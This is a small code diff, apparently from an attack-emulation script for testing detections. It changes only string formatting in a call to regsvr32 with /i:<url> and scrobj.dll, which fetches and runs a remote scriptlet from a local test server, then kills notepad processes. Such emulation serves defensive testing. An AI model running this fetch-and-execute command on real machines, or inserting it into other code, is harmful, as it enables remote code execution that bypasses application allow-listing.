@@ -21,7 +21,7 @@ def main():
     uri = 'bin/notepad.sct'
     url = 'http://%s:%d/%s' % (ip, port, uri)
 
-    common.execute(["regsvr32.exe", "/u", "/n", "/s", "/i:%s" % url, "scrobj.dll"])
+    common.execute(["regsvr32.exe", "/u", "/n", "/s", f"/i:{url}", "scrobj.dll"])
     common.log("Killing all notepads to cleanup", "-")
     common.execute(["taskkill", "/f", "/im", "notepad.exe"])
 
